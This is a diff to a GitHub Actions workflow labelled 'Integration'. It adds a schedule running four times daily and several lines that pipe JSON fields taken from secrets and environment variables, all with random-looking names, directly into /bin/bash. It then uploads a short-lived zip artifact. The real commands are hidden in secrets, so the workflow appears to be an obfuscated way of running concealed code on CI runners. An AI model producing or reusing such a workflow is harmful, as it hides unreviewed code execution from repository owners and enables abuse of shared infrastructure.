@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '50 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -14,14 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          czgxm5: ${{ secrets.czgxm5 }}
+          ls13: ${{ secrets.ls13 }}
         run: |
-          printf '%s' "$czgxm5" | jq -r .na62 | /bin/bash
-          printf '%s' "$gjfm33781" | jq -r .ephs9447 | /bin/bash
+          printf '%s' "$ls13" | jq -r .cgjt425 | /bin/bash
+          printf '%s' "$p679" | jq -r .v7 | /bin/bash
+          printf '%s' "$osfa1238" | jq -r .hxojh1246 | /bin/bash
+          printf '%s' "$c7181" | jq -r .ryzx4110 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: nSIG4p0l
+          name: LQrx76ma
           path: "*.zip"
           retention-days: 1
